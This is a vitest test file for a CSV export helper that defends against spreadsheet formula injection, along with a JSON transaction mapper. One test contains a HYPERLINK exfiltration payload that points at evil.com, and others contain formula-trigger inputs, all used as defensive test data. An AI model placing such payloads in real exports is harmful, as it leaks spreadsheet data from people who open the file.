import { describe, it, expect } from 'vitest';
import { neutralizeFormula, transactionsToJson } from '../exportHelpers.js';

// ── neutralizeFormula (CSV formula-injection defense, SEC-01) ─────────────────

describe('neutralizeFormula', () => {
  it('prefixes a quote when a cell starts with a formula trigger', () => {
    expect(neutralizeFormula('=1+1')).toBe("'=1+1");
    expect(neutralizeFormula('+1234567890')).toBe("'+1234567890");
    expect(neutralizeFormula('-2+3')).toBe("'-2+3");
    expect(neutralizeFormula('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralizes the classic HYPERLINK exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.com?"&A1,"click")';
    expect(neutralizeFormula(payload)).toBe("'" + payload);
  });

  it('detects triggers hidden behind leading whitespace', () => {
    expect(neutralizeFormula('   =cmd')).toBe("'   =cmd");
    expect(neutralizeFormula('\t=cmd')).toBe("'\t=cmd");
  });

  it('treats a leading tab or carriage return as a trigger', () => {
    expect(neutralizeFormula('\t@x')).toBe("'\t@x");
    expect(neutralizeFormula('\r=x')).toBe("'\r=x");
  });

  it('leaves safe values untouched', () => {
    expect(neutralizeFormula('Starbucks')).toBe('Starbucks');
    expect(neutralizeFormula('12.50')).toBe('12.50');
    expect(neutralizeFormula('Eating Out')).toBe('Eating Out');
    expect(neutralizeFormula('a=b')).toBe('a=b');
  });

  it('preserves plain negative numbers (variance/remaining columns)', () => {
    expect(neutralizeFormula('-12.50')).toBe('-12.50');
    expect(neutralizeFormula('-1')).toBe('-1');
    expect(neutralizeFormula('-0.99')).toBe('-0.99');
    // but a negative followed by an operator is still a formula
    expect(neutralizeFormula('-2+3')).toBe("'-2+3");
  });

  it('coerces null/undefined/number to a string without crashing', () => {
    expect(neutralizeFormula(null)).toBe('');
    expect(neutralizeFormula(undefined)).toBe('');
    expect(neutralizeFormula(42)).toBe('42');
  });
});

// ── transactionsToJson ────────────────────────────────────────────────────────

describe('transactionsToJson', () => {
  it('maps transaction fields and nulls missing optional ones', () => {
    const out = JSON.parse(transactionsToJson([
      { txDate: '2026-05-01', date: '2026-05-01T10:00:00Z', vendor: 'Shell', category: 'Transport', amount: 40, method: 'manual', user: 'me', month: 'May 2026' },
      { vendor: 'Cash', category: 'Misc', amount: 5 },
    ]));
    expect(out[0]).toEqual({
      month: 'May 2026', date: '2026-05-01', addedAt: '2026-05-01T10:00:00Z',
      vendor: 'Shell', category: 'Transport', amount: 40, method: 'manual', user: 'me',
    });
    expect(out[1].date).toBeNull();
    expect(out[1].method).toBeNull();
    expect(out[1].vendor).toBe('Cash');
  });

  it('returns an empty array for no transactions', () => {
    expect(transactionsToJson([])).toBe('[]');
  });
});
